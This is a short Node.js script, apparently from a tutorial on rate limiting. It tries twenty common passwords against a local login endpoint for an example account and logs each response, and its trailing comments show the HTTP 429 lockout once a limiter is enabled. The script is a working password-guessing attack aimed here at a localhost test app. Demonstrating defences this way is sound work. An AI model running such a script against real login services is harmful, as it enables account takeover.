// attack.js — no require needed if Node 18+
const attack = async () => {
  const passwords = ['123456', 'password', 'qwerty', 'abc123', 'letmein',
                     'monkey', 'dragon', '111111', 'baseball', 'iloveyou',
                     'master', 'sunshine', 'ashley', 'bailey', 'passw0rd',
                     'shadow', 'superman', '654321', 'michael', 'football'];

  for (const pwd of passwords) {
    const res = await fetch('http://localhost:5000/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'alice@example.com', password: pwd })
    });
    const data = await res.json();
    console.log(`Password: ${pwd} → Status: ${res.status} → ${data.message || 'SUCCESS!'}`);
  }
};

attack();
// ```

// Run with `node attack.js`.

// ### With rate limiter ON

// After 100 requests in 15 minutes you'll see:
// ```
// Status: 429 → Too many requests, please try again later